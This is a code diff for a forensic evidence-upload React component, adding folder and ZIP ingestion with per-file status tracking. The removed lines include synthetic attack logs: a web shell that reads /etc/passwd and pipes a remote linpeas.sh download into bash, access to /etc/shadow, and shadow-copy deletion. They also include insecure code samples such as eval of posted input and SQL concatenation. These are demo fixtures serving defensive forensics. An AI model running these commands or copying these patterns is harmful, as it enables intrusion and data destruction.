@@ -1,157 +1,383 @@
 import React, { useState, useRef } from 'react';
 import { useApp } from '../store';
-import { UploadCloud, FileText, CheckCircle2, AlertTriangle, RefreshCw, Sparkles, Hash, Eye } from 'lucide-react';
+import { UploadCloud, FileText, CheckCircle2, AlertTriangle, RefreshCw, Hash, FolderOpen } from 'lucide-react';
 import { ParserType } from '../types';
+import {
+  collectFilesFromDataTransfer,
+  collectFilesFromFileList,
+  FolderWalkResult,
+  validateUploadBatch,
+} from '../utils/folderUpload';
 
 interface UploadDropzoneProps {
   caseId: string;
   onUploadSuccess?: () => void;
 }
 
+type UploadQueueStatus = 'queued' | 'uploading' | 'parsed' | 'unsupported' | 'duplicate' | 'failed';
+
+interface UploadBatchItem {
+  key: string;
+  name: string;
+  relativePath?: string;
+  hash: string;
+  events: number;
+  status: UploadQueueStatus;
+  reason?: string;
+}
+
+const STATUS_BADGE_CLASS: Record<UploadQueueStatus, string> = {
+  queued: 'text-[#a8a29e]',
+  uploading: 'text-[#f95721]',
+  parsed: 'text-emerald-400',
+  duplicate: 'text-amber-400',
+  unsupported: 'text-orange-400',
+  failed: 'text-red-400',
+};
+
+const STATUS_LABEL: Record<UploadQueueStatus, string> = {
+  queued: 'Queued',
+  uploading: 'Uploading...',
+  parsed: 'Parsed',
+  duplicate: 'Duplicate, skipped',
+  unsupported: 'Unsupported',
+  failed: 'Failed',
+};
+
 export const UploadDropzone: React.FC<UploadDropzoneProps> = ({ caseId, onUploadSuccess }) => {
   const { uploadEvidence, currentUser, setCurrentPage, setAuthNotice } = useApp();
   const fileInputRef = useRef<HTMLInputElement>(null);
+  const folderInputRef = useRef<HTMLInputElement | null>(null);
+  const setFolderInputRef = React.useCallback((el: HTMLInputElement | null) => {
+    folderInputRef.current = el;
+    if (el) {
+      const dirInput = el as HTMLInputElement & { webkitdirectory?: boolean; directory?: boolean };
+      dirInput.webkitdirectory = true;
+      dirInput.directory = true;
+      el.setAttribute('webkitdirectory', '');
+      el.setAttribute('directory', '');
+    }
+  }, []);
+  const batchCounterRef = useRef(0);
 
   const [isDragging, setIsDragging] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [selectedParser, setSelectedParser] = useState<ParserType | 'auto'>('auto');
-  const [recentUploads, setRecentUploads] = useState<{ name: string; hash: string; events: number; status: string }[]>([]);
+  const [recentUploads, setRecentUploads] = useState<UploadBatchItem[]>([]);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
-  const [hoveredTile, setHoveredTile] = useState<{ index: number; snippet: string } | null>(null);
+  const [batchNotice, setBatchNotice] = useState<string | null>(null);
 
-  const handleFiles = async (files: FileList | null) => {
+  const requireAuth = (): boolean => {
     if (!currentUser) {
       setAuthNotice('Please sign in to upload digital evidence. If you do not have an account, please register.');
       setCurrentPage('login');
+      return false;
+    }
+    return true;
+  };
+
+  const updateBatchItem = (key: string, patch: Partial<UploadBatchItem>) => {
+    setRecentUploads((prev) => prev.map((item) => (item.key === key ? { ...item, ...patch } : item)));
+  };
+
+  const insertChildrenAfter = (parentKey: string, children: UploadBatchItem[]) => {
+    if (children.length === 0) return;
+    setRecentUploads((prev) => {
+      const idx = prev.findIndex((item) => item.key === parentKey);
+      if (idx === -1) return [...children, ...prev];
+      const next = [...prev];
+      next.splice(idx + 1, 0, ...children);
+      return next;
+    });
+  };
+
+  const processWalkResult = async (walkResult: FolderWalkResult) => {
+    if (!requireAuth()) return;
+
+    setErrorMessage(null);
+    setBatchNotice(null);
+
+    if (walkResult.files.length === 0) {
+      if (walkResult.skippedJunkCount > 0) {
+        setErrorMessage(
+          `No uploadable evidence files found (skipped ${walkResult.skippedJunkCount} hidden/system file(s)).`
+        );
+      } else if (walkResult.skippedDirectoryCount > 0) {
+        setErrorMessage('Selected folder is empty or contains no uploadable evidence files.');
+      } else {
+        setErrorMessage('No files were returned by the folder/file picker or drop event.');
+      }
       return;
     }
-    if (!files || files.length === 0) return;
+
+    const validation = validateUploadBatch(walkResult.files);
+    if (validation.batchError) {
+      setErrorMessage(validation.batchError);
+      return;
+    }
+
+    batchCounterRef.current += 1;
+    const batchPrefix = `batch-${batchCounterRef.current}-${Date.now()}`;
+
+    const initialItems: UploadBatchItem[] = [
+      ...validation.validFiles.map((entry, idx) => ({
+        key: `${batchPrefix}-file-${idx}`,
+        name: entry.file.name,
+        relativePath: entry.relativePath !== entry.file.name ? entry.relativePath : undefined,
+        hash: '-',
+        events: 0,
+        status: 'queued' as const,
+      })),
+      ...validation.oversizedFiles.map((entry, idx) => ({
+        key: `${batchPrefix}-oversize-${idx}`,
+        name: entry.file.name,
+        relativePath: entry.relativePath !== entry.file.name ? entry.relativePath : undefined,
+        hash: '-',
+        events: 0,
+        status: 'failed' as const,
+        reason: entry.reason,
+      })),
+    ];
+
+    setRecentUploads((prev) => [...initialItems, ...prev]);
+
+    const skippedNotes: string[] = [];
+    if (walkResult.skippedJunkCount > 0) {
+      skippedNotes.push(`Skipped ${walkResult.skippedJunkCount} hidden/system file(s)`);
+    }
+    if (validation.oversizedFiles.length > 0) {
+      setErrorMessage(
+        validation.oversizedFiles
+          .map((f) => `File ${f.file.name}: ${f.reason}`)
+          .join('; ')
+      );
+    }
+
+    if (validation.validFiles.length === 0) {
+      if (skippedNotes.length > 0) setBatchNotice(skippedNotes.join(' · '));
+      return;
+    }
+
     setIsProcessing(true);
-    setErrorMessage(null);
 
-    const uploadsSummary: { name: string; hash: string; events: number; status: string }[] = [];
+    let batchCaseId = caseId;
+    let uploadedOrReusedCount = 0;
+    const failureMessages: string[] = validation.oversizedFiles.map(
+      (f) => `${f.file.name}: ${f.reason}`
+    );
+    let duplicateCount = 0;
 
-    for (let i = 0; i < files.length; i++) {
-      const file = files[i];
+    for (let i = 0; i < validation.validFiles.length; i += 1) {
+      const { file, relativePath } = validation.validFiles[i];
+      const itemKey = `${batchPrefix}-file-${i}`;
+      const webkitRel = (file as File & { webkitRelativePath?: string }).webkitRelativePath || '';
 
-      // Check max size (100 MB per FR-EVID-4)
-      if (file.size > 100 * 1024 * 1024) {
-        setErrorMessage(`File ${file.name} exceeds maximum allowed size of 100 MB.`);
-        continue;
-      }
+      updateBatchItem(itemKey, { status: 'uploading', reason: undefined });
+      console.log('[folder-upload] Upload start:', {
+        index: i + 1,
+        total: validation.validFiles.length,
+        name: file.name,
+        size: file.size,
+        webkitRelativePath: webkitRel,
+        relativePath,
+        caseId: batchCaseId,
+      });
 
       try {
         const parserOverride = selectedParser === 'auto' ? undefined : selectedParser;
-        const result = await uploadEvidence(caseId, file, parserOverride);
-        uploadsSummary.push({
-          name: result.filename,
-          hash: result.sha256_hash,
-          events: result.event_count,
-          status: result.status
-        });
+        const result = await uploadEvidence(batchCaseId, file, parserOverride);
+        if (!batchCaseId && result.case_id) {
+          batchCaseId = result.case_id;
+        }
+        uploadedOrReusedCount += 1;
+
+        const hasZipMembers =
+          Array.isArray(result.extracted_results) && result.extracted_results.length > 0;
+
+        if (result.duplicate && !hasZipMembers) {
+          duplicateCount += 1;
+          updateBatchItem(itemKey, {
+            name: result.filename || file.name,
+            hash: result.sha256_hash || '-',
+            events: result.event_count ?? 0,
+            status: 'duplicate',
+            reason: 'Already ingested in this case',
+          });
+          continue;
+        }
+
+        if (hasZipMembers) {
+          if (result.duplicate) duplicateCount += 1;
+          updateBatchItem(itemKey, {
+            name: result.filename || file.name,
+            hash: result.sha256_hash || '-',
+            events: result.event_count ?? 0,
+            status: result.duplicate
+              ? 'duplicate'
+              : result.status === 'Failed'
+                ? 'failed'
+                : 'parsed',
+            reason: result.duplicate
+              ? 'Archive already ingested; existing artifacts reused'
+              : result.status === 'Failed'
+                ? 'Archive extraction failed'
+                : undefined,
+          });
+
+          const childItems: UploadBatchItem[] = result.extracted_results!.map((member, mIdx) => {
+            let memberStatus: UploadQueueStatus = 'parsed';
+            let memberReason: string | undefined;
+
+            if (member.status === 'duplicate') {
+              memberStatus = 'duplicate';
+              memberReason = 'Already ingested in this case';
+              duplicateCount += 1;
+            } else if (member.status === 'failed') {
+              const errText = member.error || 'Failed to parse';
+              memberStatus = /unsupported file extension|no suitable parser/i.test(errText)
+                ? 'unsupported'
+                : 'failed';
+              memberReason = errText;
+              failureMessages.push(`${member.filename}: ${errText}`);
+            } else if (member.evidence?.status === 'Failed') {
+              memberStatus = 'failed';
+              memberReason = 'Parsing failed';
+              failureMessages.push(`${member.filename}: Parsing failed`);
+            }
+
+            return {
+              key: `${itemKey}-zip-${mIdx}`,
+              name: member.filename,
+              relativePath: `${relativePath} -> ${member.filename}`,
+              hash: member.evidence?.sha256_hash || '-',
+              events: member.evidence?.event_count ?? 0,
+              status: memberStatus,
+              reason: memberReason,
+            };
+          });
+
+          insertChildrenAfter(itemKey, childItems);
+          continue;
+        }
+
+        if (result.status === 'Failed') {
+          failureMessages.push(`${file.name}: Failed to parse`);
+          updateBatchItem(itemKey, {
+            name: result.filename || file.name,
+            hash: result.sha256_hash || '-',
+            events: result.event_count ?? 0,
+            status: 'failed',
+            reason: 'Parser could not extract events from this artifact',
+          });
+        } else {
+          updateBatchItem(itemKey, {
+            name: result.filename || file.name,
+            hash: result.sha256_hash || '-',
+            events: result.event_count ?? 0,
+            status: 'parsed',
+            reason: undefined,
+          });
+        }
       } catch (err: any) {
-        setErrorMessage(`Failed to process ${file.name}: ${err.message}`);
+        const message = err?.message || 'Upload failed';
+        const httpStatus = typeof err?.status === 'number' ? err.status : undefined;
+        const rawDetail = err?.detail;
+        const detailStr =
+          rawDetail === undefined || rawDetail === null
+            ? ''
+            : typeof rawDetail === 'string'
+              ? rawDetail
+              : JSON.stringify(rawDetail);
+        const reasonParts = [message];
+        if (httpStatus !== undefined && !message.includes(`HTTP ${httpStatus}`)) {
+          reasonParts.push(`status=${httpStatus}`);
+        }
+        if (detailStr && !message.includes(detailStr)) {
+          reasonParts.push(`detail=${detailStr}`);
+        }
+        const reason = reasonParts.join(' | ');
+        console.error('[folder-upload] Upload catch error:', {
+          name: file.name,
+          webkitRelativePath: webkitRel,
+          message,
+          status: httpStatus,
+          detail: rawDetail,
+          error: err,
+        });
+        const isUnsupported = /unsupported file extension|no suitable parser/i.test(reason);
+        failureMessages.push(`${file.name}: ${reason}`);
+        updateBatchItem(itemKey, {
+          status: isUnsupported ? 'unsupported' : 'failed',
+          reason,
+        });
       }
     }
 
-    setRecentUploads(prev => [...uploadsSummary, ...prev]);
+    if (failureMessages.length > 0) {
+      setErrorMessage(
+        failureMessages.length === 1
+          ? `Failed to process ${failureMessages[0]}`
+          : `${failureMessages.length} file(s) could not be fully processed: ${failureMessages.slice(0, 3).join('; ')}${failureMessages.length > 3 ? ` (+${failureMessages.length - 3} more)` : ''}`
+      );
+    }
+
+    if (duplicateCount > 0) {
+      skippedNotes.push(`${duplicateCount} duplicate(s) skipped (already ingested)`);
+    }
+    if (skippedNotes.length > 0) {
+      setBatchNotice(skippedNotes.join(' · '));
+    }
+
     setIsProcessing(false);
-    if (onUploadSuccess && uploadsSummary.length > 0) {
+
+    if (onUploadSuccess && uploadedOrReusedCount > 0) {
       onUploadSuccess();
     }
   };
 
-  const handleDrop = (e: React.DragEvent) => {
+  const logPickedSample = (source: 'picker' | 'drop', rawCount: number, walkResult: FolderWalkResult) => {
+    const firstThree = walkResult.files.slice(0, 3).map((item) => ({
+      name: item.file.name,
+      webkitRelativePath: (item.file as File & { webkitRelativePath?: string }).webkitRelativePath || '',
+      relativePath: item.relativePath,
+    }));
+    console.log(`[folder-upload] ${source} returned ${rawCount} raw item(s); walked ${walkResult.files.length} uploadable file(s), skippedJunk=${walkResult.skippedJunkCount}, skippedDir=${walkResult.skippedDirectoryCount}`);
+    console.log('[folder-upload] First 3 files (name & webkitRelativePath):', firstThree);
+  };
+
+  const handleFiles = async (files: FileList | File[] | null) => {
+    const rawCount = files ? files.length : 0;
+    const walkResult = collectFilesFromFileList(files);
+    logPickedSample('picker', rawCount, walkResult);
+    await processWalkResult(walkResult);
+  };
+
+  const handleDrop = async (e: React.DragEvent) => {
     e.preventDefault();
     setIsDragging(false);
-    handleFiles(e.dataTransfer.files);
-  };
-
-  // Preset quick synthetic evidence inject for instant testing
-  const injectSampleEvidence = async (sampleType: 'nginx_webshell' | 'linux_auth' | 'windows_powershell') => {
-    if (!currentUser) {
-      setAuthNotice('Please sign in to upload digital evidence. If you do not have an account, please register.');
-      setCurrentPage('login');
-      return;
+    if (!requireAuth()) return;
+    try {
+      const rawCount = e.dataTransfer?.items?.length ?? e.dataTransfer?.files?.length ?? 0;
+      const walkResult = await collectFilesFromDataTransfer(e.dataTransfer);
+      logPickedSample('drop', rawCount, walkResult);
+      await processWalkResult(walkResult);
+    } catch (err: any) {
+      console.error('[folder-upload] Drop error:', err);
+      setErrorMessage(`Failed to read dropped folder or files: ${err?.message || 'Unknown error'}`);
     }
-    setIsProcessing(true);
-    let filename = '';
-    let content = '';
-
-    if (sampleType === 'nginx_webshell') {
-      filename = `nginx_dmz_breach_${Date.now()}.log`;
-      content = `198.51.100.42 - - [22/Sep/2026:03:10:45 +0000] "POST /uploads/avatar_temp.php HTTP/1.1" 200 412 "-" "Python-urllib/3.10"
-198.51.100.42 - - [22/Sep/2026:03:14:22 +0000] "POST /uploads/shell.php?cmd=whoami;id;uname%20-a HTTP/1.1" 200 84
-198.51.100.42 - - [22/Sep/2026:03:18:01 +0000] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 2410
-198.51.100.42 - - [22/Sep/2026:03:25:30 +0000] "POST /uploads/shell.php?cmd=curl%20http://198.51.100.42:8000/linpeas.sh|bash HTTP/1.1" 200 12040`;
-    } else if (sampleType === 'linux_auth') {
-      filename = `auth_compromise_${Date.now()}.log`;
-      content = `Sep 22 03:20:10 web01 sshd[4102]: Failed password for invalid user admin from 198.51.100.42 port 51221 ssh2
-Sep 22 03:20:12 web01 sshd[4104]: Failed password for invalid user root from 198.51.100.42 port 51223 ssh2
-Sep 22 03:22:15 web01 sudo: www-data : TTY=pts/1 ; PWD=/var/www/html/uploads ; USER=root ; COMMAND=/bin/bash
-Sep 22 03:35:40 web01 auditd[1124]: type=SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0=/etc/shadow
-Sep 22 03:52:04 web01 ssh[4912]: OpenSSH_9.2 initiated connection from 192.168.1.50:52188 to 192.168.1.10:22 user admin_backup`;
-    } else {
-      filename = `sysmon_powershell_${Date.now()}.json`;
-      content = JSON.stringify([
-        {
-          EventID: 4688,
-          TimeCreated: new Date().toISOString(),
-          TargetUserName: "finance_svc",
-          Computer: "ws-fin-04.corp.local",
-          NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          CommandLine: "powershell.exe -enc JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...",
-          Message: "Process Creation: Obfuscated Encoded PowerShell Execution"
-        },
-        {
-          EventID: 4688,
-          TimeCreated: new Date().toISOString(),
-          TargetUserName: "finance_svc",
-          Computer: "ws-fin-04.corp.local",
-          NewProcessName: "C:\\Windows\\System32\\vssadmin.exe",
-          CommandLine: "vssadmin delete shadows /all /quiet",
-          Message: "Process Creation: Volume Shadow Copy Purge"
-        }
-      ], null, 2);
-    }
-
-    const file = new File([content], filename, { type: 'text/plain' });
-    await uploadEvidence(caseId, file);
-    setIsProcessing(false);
-    if (onUploadSuccess) onUploadSuccess();
   };
-
-  // 36 heatmap tiles matching Screenshot 2 concern matrix
-  const concernTiles = [
-    { level: 'high', code: 'import bcrypt\ndef hash_password(password):\n  salt = bcrypt.gensalt()\n  return bcrypt.hashpw(password, salt)' },
-    { level: 'high', code: 'def check_password(password, hashed):\n  return bcrypt.checkpw(password, hashed)' },
-    { level: 'medium', code: 'OPENSSL_CIPHER_SUITE = "ECDHE-RSA-AES256-GCM-SHA384"' },
-    { level: 'low', code: 'SESSION_EXPIRY = 28800 # 8 hours max token lifetime' },
-    { level: 'high', code: 'eval(base64_decode($_POST["cmd"])) # Unsafe dynamic execution' },
-    { level: 'medium', code: 'SSH_ALLOW_TCP_FORWARDING = false' },
-    { level: 'high', code: 'SELECT * FROM users WHERE id = " + user_input + "' },
-    { level: 'low', code: 'FIPS_MODE_ENABLED = true # SP 800-86 compliant' },
-    { level: 'medium', code: 'CORS_ALLOWED_ORIGINS = ["https://dcsre.corp"]' },
-    { level: 'high', code: 'chmod -R 777 /etc/forensics/custody_chain.db' },
-    { level: 'medium', code: 'ALLOW_ROOT_SSH_LOGIN = false' },
-    { level: 'low', code: 'AUDIT_LOG_TAMPER_SEAL = SHA256_HMAC' },
-    { level: 'high', code: 'subprocess.Popen(shell=True, args=untrusted_arg)' },
-    { level: 'low', code: 'RATE_LIMIT_BUCKET = 5 # failed attempts window 15m' },
-    { level: 'medium', code: 'TLS_STRICT_SNI_CHECK = true' },
-    { level: 'high', code: 'vssadmin delete shadows /all /quiet # Ransomware indicator' }
-  ];
 
   return (
     <div className="space-y-4">
       {/* Configuration & Dropzone Card */}
       <div className="bg-[#161413]/90 border border-[#2b2523] rounded-2xl p-6 shadow-xl space-y-5">
-        
+
         {/* Top Controls */}
         <div className="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-[#2b2523]">
           <div>
             <h3 className="text-sm font-semibold text-[#fafaf9]">Evidence Ingestion & Integrity Validator</h3>
             <p className="text-xs text-[#a8a29e] mt-0.5">
-              Supports Linux syslog, Windows EVTX/Sysmon, Web server logs, PCAP summaries, XML, JSON & CSV.
+              Supports files, nested folders, and ZIP archives (Linux syslog, Windows EVTX/Sysmon, Web server logs, PCAP, XML, JSON, CSV, TXT).
             </p>
           </div>
 
@@ -167,157 +393,110 @@ Sep 22 03:52:04 web01 ssh[4912]: OpenSSH_9.2 initiated connection from 192.168.1
               <option value="web_server">Nginx / Apache Web Server Log</option>
               <option value="linux_auth">Linux Auth / Syslog</option>
               <option value="windows_evtx">Windows Event Logs (EVTX/JSON)</option>
-              <option value="pcap_summary">PCAP Network Summary CSV</option>
-              <option value="generic_json_csv">Generic Forensic CSV / JSON</option>
+              <option value="pcap_summary">PCAP Network Capture / Summary</option>
+              <option value="generic_json_csv">Generic Forensic CSV / JSON / TXT</option>
             </select>
           </div>
         </div>
 
-        {/* Drag and Drop Area + Screenshot 2 Concern Heatmap side-by-side */}
-        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-stretch">
-          
-          {/* Main Dropzone (7 cols) */}
-          <div
-            onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
-            onDragLeave={() => setIsDragging(false)}
-            onDrop={handleDrop}
-            onClick={() => {
-              if (!currentUser) {
-                setAuthNotice('Please sign in to upload digital evidence. If you do not have an account, please register.');
-                setCurrentPage('login');
-                return;
-              }
-              fileInputRef.current?.click();
-            }}
-            className={`lg:col-span-7 relative border-2 border-dashed rounded-xl p-6 text-center cursor-pointer transition-all flex flex-col items-center justify-center min-h-[160px] ${
-              isDragging
-                ? 'border-[#f95721] bg-[#2a140d]/40 shadow-[0_0_15px_rgba(249,87,33,0.3)]'
-                : 'border-[#332c28] hover:border-[#f95721]/60 bg-[#110f0e]/80 hover:bg-[#141210]'
+        {/* File & Folder Inputs kept outside the clickable dropzone so input clicks never bubble to fileInputRef */}
+        <input
+          ref={fileInputRef}
+          type="file"
+          multiple
+          className="hidden"
+          accept=".log,.txt,.evtx,.pcap,.pcapng,.csv,.json,.pdf,.xml,.zip"
+          onClick={(e) => e.stopPropagation()}
+          onChange={(e) => {
+            const snapshot = Array.from(e.target.files || []);
+            e.target.value = '';
+            void handleFiles(snapshot);
+          }}
+        />
+        <input
+          ref={setFolderInputRef}
+          type="file"
+          multiple
+          className="hidden"
+          onClick={(e) => e.stopPropagation()}
+          onChange={(e) => {
+            const snapshot = Array.from(e.target.files || []);
+            e.target.value = '';
+            void handleFiles(snapshot);
+          }}
+        />
+
+        {/* Clean Full-Width Drag and Drop Area */}
+        <div
+          onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
+          onDragLeave={() => setIsDragging(false)}
+          onDrop={handleDrop}
+          onClick={(e) => {
+            if ((e.target as HTMLElement).closest('button')) return;
+            if (isProcessing || !requireAuth()) return;
+            fileInputRef.current?.click();
+          }}
+          className={`w-full relative border-2 border-dashed rounded-xl p-8 text-center cursor-pointer transition-all flex flex-col items-center justify-center min-h-[180px] ${isDragging
+            ? 'border-[#f95721] bg-[#2a140d]/40 shadow-[0_0_15px_rgba(249,87,33,0.3)]'
+            : 'border-[#332c28] hover:border-[#f95721]/60 bg-[#110f0e]/80 hover:bg-[#141210]'
             }`}
-          >
-            <input
-              ref={fileInputRef}
-              type="file"
-              multiple
-              className="hidden"
-              accept=".log,.txt,.evtx,.pcap,.pcapng,.csv,.json,.pdf,.xml"
-              onChange={(e) => handleFiles(e.target.files)}
-            />
+        >
 
-            <div className="flex flex-col items-center justify-center space-y-2">
-              <div className="w-11 h-11 rounded-xl bg-[#221712] border border-[#ea580c]/40 flex items-center justify-center text-[#f95721] shadow-inner">
-                {isProcessing ? (
-                  <RefreshCw className="w-5 h-5 animate-spin text-[#f95721]" />
-                ) : (
-                  <UploadCloud className="w-5 h-5" />
-                )}
-              </div>
-
-              <div>
-                <p className="text-sm font-medium text-[#fafaf9]">
-                  {isProcessing ? 'Streaming cryptographic SHA-256 hash & parsing...' : (
-                    <span>Drag & drop files or <span className="text-[#f95721] underline underline-offset-2 font-semibold">Browse</span></span>
-                  )}
-                </p>
-                <p className="text-[11px] text-[#78716c] mt-0.5 font-mono">
-                  Supported formats: LOG, TXT, EVTX, PCAP, CSV, JSON, XML, PDF (Max 100 MB)
-                </p>
-              </div>
-
-              <div className="inline-flex items-center gap-1.5 text-[10px] text-[#a8a29e] font-mono pt-1">
-                <Hash className="w-3 h-3 text-[#f95721]" />
-                <span>SHA-256 computed client-side · Strict Chain of Custody</span>
-              </div>
-            </div>
-          </div>
-
-          {/* Screenshot 2: Concern Heatmap Matrix (5 cols) */}
-          <div className="lg:col-span-5 rounded-xl bg-[#100f0e] border border-[#2b2523] p-4 flex flex-col justify-between relative">
-            <div className="flex items-center justify-between text-[11px] font-mono text-[#a8a29e] mb-2">
-              <span className="flex items-center gap-1.5 text-[#fafaf9] font-medium">
-                <span className="w-2 h-2 rounded-full bg-[#f95721]" />
-                <span>Evidence Ingestion Heatmap</span>
-              </span>
-              <div className="flex items-center gap-2 text-[10px]">
-                <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-sm bg-[#eab308]" /> Low</span>
-                <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-sm bg-[#f97316]" /> Mod</span>
-                <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-sm bg-[#f95721]" /> High</span>
-              </div>
+          <div className="flex flex-col items-center justify-center space-y-3">
+            <div className="w-12 h-12 rounded-xl bg-[#221712] border border-[#ea580c]/40 flex items-center justify-center text-[#f95721] shadow-inner">
+              {isProcessing ? (
+                <RefreshCw className="w-6 h-6 animate-spin text-[#f95721]" />
+              ) : (
+                <UploadCloud className="w-6 h-6" />
+              )}
             </div>
 
-            {/* Glowing Squares Grid matching Screenshot 2 */}
-            <div className="grid grid-cols-8 gap-1.5 py-1">
-              {concernTiles.map((tile, idx) => (
-                <div
-                  key={idx}
-                  onMouseEnter={() => setHoveredTile({ index: idx, snippet: tile.code })}
-                  onMouseLeave={() => setHoveredTile(null)}
-                  className={`aspect-square rounded-sm cursor-pointer transition-all duration-200 hover:scale-110 relative ${
-                    tile.level === 'high'
-                      ? 'bg-[#f95721] hover:shadow-[0_0_8px_#f95721]'
-                      : tile.level === 'medium'
-                      ? 'bg-[#ea580c] opacity-80'
-                      : 'bg-[#b45309] opacity-60'
-                  }`}
-                />
-              ))}
-            </div>
-
-            {/* Floating Concern Code Preview Popover (Screenshot 2) */}
-            {hoveredTile && (
-              <div className="absolute top-12 left-4 right-4 z-20 p-3 bg-[#181615] border border-[#ea580c]/60 rounded-xl shadow-2xl animate-fadeIn space-y-1">
-                <div className="flex items-center justify-between text-[10px] font-mono text-[#fb923c]">
-                  <span className="flex items-center gap-1 font-semibold">
-                    <Eye className="w-3 h-3" />
-                    <span>Concern preview</span>
+            <div className="space-y-2">
+              <p className="text-sm font-medium text-[#fafaf9]">
+                {isProcessing ? 'Streaming cryptographic SHA-256 hash & parsing forensic artifacts one by one...' : (
+                  <span>
+                    Drag & drop forensic files or a folder here, or{' '}
+                    <span className="text-[#f95721] underline underline-offset-2 font-semibold">Browse Files</span>
                   </span>
-                  <span className="text-[#78716c]">Target #{hoveredTile.index + 1}</span>
-                </div>
-                <pre className="text-[10px] font-mono text-[#fafaf9] bg-[#0c0b0a] p-2 rounded border border-[#2b2523] overflow-x-auto whitespace-pre-wrap">
-                  {hoveredTile.snippet}
-                </pre>
-              </div>
-            )}
+                )}
+              </p>
 
-            <div className="text-[10px] font-mono text-[#78716c] pt-2 border-t border-[#24201e] flex justify-between">
-              <span>Automated Forensic Triage</span>
-              <span className="text-[#fb923c]">42% Controls Evaluated</span>
+              {!isProcessing && (
+                <div className="flex items-center justify-center">
+                  <button
+                    type="button"
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      if (!requireAuth()) return;
+                      folderInputRef.current?.click();
+                    }}
+                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1d1816] hover:bg-[#2a211d] border border-[#3a312c] hover:border-[#f95721]/60 text-xs font-medium text-[#fafaf9] cursor-pointer transition-colors"
+                  >
+                    <FolderOpen className="w-3.5 h-3.5 text-[#f95721]" />
+                    <span>Browse Folder</span>
+                  </button>
+                </div>
+              )}
+
+              <p className="text-[11px] text-[#78716c] mt-1 font-mono">
+                Supported formats: PCAP, EVTX, LOG, TXT, CSV, JSON, XML, PDF, ZIP or Folders (Max 100 files, 100 MB/file, 250 MB total)
+              </p>
+            </div>
+
+            <div className="inline-flex items-center gap-1.5 text-[10px] text-[#a8a29e] font-mono pt-1">
+              <Hash className="w-3 h-3 text-[#f95721]" />
+              <span>Cryptographic SHA-256 integrity verification · Automated Chain of Custody</span>
             </div>
           </div>
-
         </div>
 
-        {/* Quick Sample Injectors for Instant Testing & Demonstrations */}
-        <div className="pt-4 border-t border-[#2b2523] flex flex-wrap items-center justify-between gap-3 text-xs">
-          <div className="flex items-center gap-1.5 text-[#a8a29e]">
-            <Sparkles className="w-3.5 h-3.5 text-[#f95721]" />
-            <span>Load synthetic forensic test artifacts:</span>
+        {/* Info / Duplicate / Skipped Notification */}
+        {batchNotice && (
+          <div className="p-3 bg-amber-950/35 border border-amber-700/60 rounded-lg flex items-center gap-2 text-xs text-amber-200">
+            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
+            <span>{batchNotice}</span>
           </div>
-
-          <div className="flex flex-wrap gap-2">
-            <button
-              onClick={() => injectSampleEvidence('nginx_webshell')}
-              disabled={isProcessing}
-              className="px-3 py-1 rounded-lg bg-[#191716] hover:bg-[#25201d] border border-[#2c2724] text-[#d6d3d1] font-mono text-[11px] transition-colors hover:text-[#f95721]"
-            >
-              + Web Shell Nginx Log
-            </button>
-            <button
-              onClick={() => injectSampleEvidence('linux_auth')}
-              disabled={isProcessing}
-              className="px-3 py-1 rounded-lg bg-[#191716] hover:bg-[#25201d] border border-[#2c2724] text-[#d6d3d1] font-mono text-[11px] transition-colors hover:text-[#f95721]"
-            >
-              + Linux Auth & Sudo Log
-            </button>
-            <button
-              onClick={() => injectSampleEvidence('windows_powershell')}
-              disabled={isProcessing}
-              className="px-3 py-1 rounded-lg bg-[#191716] hover:bg-[#25201d] border border-[#2c2724] text-[#d6d3d1] font-mono text-[11px] transition-colors hover:text-[#f95721]"
-            >
-              + PowerShell EVTX/Sysmon JSON
-            </button>
-          </div>
-        </div>
+        )}
 
         {/* Error Notification */}
         {errorMessage && (
@@ -329,27 +508,58 @@ Sep 22 03:52:04 web01 ssh[4912]: OpenSSH_9.2 initiated connection from 192.168.1
 
       </div>
 
-      {/* Recent Uploads Table */}
+      {/* Recent Uploads & Per-File Progress Table */}
       {recentUploads.length > 0 && (
         <div className="bg-[#161413]/90 border border-[#2b2523] rounded-2xl p-4 shadow-xl">
-          <h4 className="text-xs font-semibold text-[#fafaf9] uppercase font-mono mb-2.5 flex items-center gap-2">
-            <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
-            Recent Upload Ingestion Batch
-          </h4>
-          <div className="space-y-2">
-            {recentUploads.map((up, i) => (
+          <div className="flex flex-wrap items-center justify-between gap-2 mb-2.5">
+            <h4 className="text-xs font-semibold text-[#fafaf9] uppercase font-mono flex items-center gap-2">
+              {isProcessing ? (
+                <RefreshCw className="w-3.5 h-3.5 text-[#f95721] animate-spin" />
+              ) : (
+                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
+              )}
+              <span>{isProcessing ? 'Ingestion Progress (Sequential)' : 'Recent Upload Ingestion Batch'}</span>
+            </h4>
+            <span className="text-[11px] font-mono text-[#a8a29e] tabular-nums">
+              {recentUploads.filter((u) => u.status === 'parsed' || u.status === 'duplicate').length} / {recentUploads.length} completed
+            </span>
+          </div>
+          <div className="space-y-2 max-h-[340px] overflow-y-auto pr-1">
+            {recentUploads.map((up) => (
               <div
-                key={i}
+                key={up.key}
                 className="flex flex-wrap items-center justify-between gap-2 p-2.5 bg-[#100f0e] border border-[#282321] rounded-xl text-xs"
               >
-                <div className="flex items-center gap-2">
-                  <FileText className="w-3.5 h-3.5 text-[#f95721]" />
-                  <span className="font-medium text-[#e7e5e4]">{up.name}</span>
+                <div className="flex flex-col gap-0.5 min-w-0">
+                  <div className="flex items-center gap-2">
